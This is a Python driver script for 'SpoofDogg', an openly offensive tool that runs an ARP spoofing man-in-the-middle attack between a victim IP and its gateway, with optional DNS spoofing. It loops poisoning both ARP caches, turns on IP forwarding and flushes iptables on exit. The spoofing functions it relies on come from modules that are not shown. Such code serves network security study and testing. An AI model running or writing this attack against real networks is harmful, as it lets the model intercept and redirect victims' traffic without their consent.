#!/usr/bin/env python3

import argparse
import time
import os
import sys
import multiprocessing
from arp_spoofer import spoof, restore, enable_ip_routing
from dns_spoofer import dns_main

sys.exit("Use the -h parameter to learn about using the program.") if len(sys.argv[1:]) == 0 else True

description = "SpoofDogg is a tool that initially starts an ARP spoofing attack. " \
              "It can also be started to initiate an automatic DNS spoofing attack afterwards as well"
parser = argparse.ArgumentParser(description=description)
parser.add_argument("target", help="Victim IP address to poison")
parser.add_argument("host", help="The host to intercept packets from. Usually this is the gateway")
parser.add_argument("-dns", "--dns_spoof", help="Start DNS spoofing after ARP poisoning. "
                                                "Only works on Linux machines due to iptables usage.", action="store_true")

args = parser.parse_args()


def get_arguments():
    """
    Initializes target_ip and host_ip
    :return: target_ip AND host_ip
    """
    target_ip = args.target
    host_ip = args.host
    return target_ip, host_ip


def dns_check():
    if ("nt" in os.name) and args.dns_spoof:
        sys.exit("DNS spoofing is only available for machines running a Linux distro.")


def spoofy():

    # Get target and host
    target, host = get_arguments()
    try:
        while True:
            # Tell the victim that we are the gateway
            spoof(target, host)

            # Tell the gateway that we are the target (victim)
            spoof(host, target)

            # Sleep for a second to prevent a dos
            time.sleep(1)
    except KeyboardInterrupt:
        # If CTRL + C is pressed, restore
        print("[!!!] CTRL + C detected. Cleaning up. Please wait.")
        restore(target, host)
        restore(host, target)
        
        
def main():

    target, host = get_arguments()
    # Check DNS compatibility
    dns_check()

    # Enable ip forwarding for the system
    enable_ip_routing()
    try:
        arper = multiprocessing.Process(target=spoofy)
        arper.start()

        if args.dns_spoof:
            dns_spoofer = multiprocessing.Process(target=dns_main())
            dns_spoofer.start()
    except KeyboardInterrupt:
        restore(target, host)
        restore(host, target)
        if args.dns_spoof:
            os.system("iptables --flush")


if __name__ == '__main__':
    main()
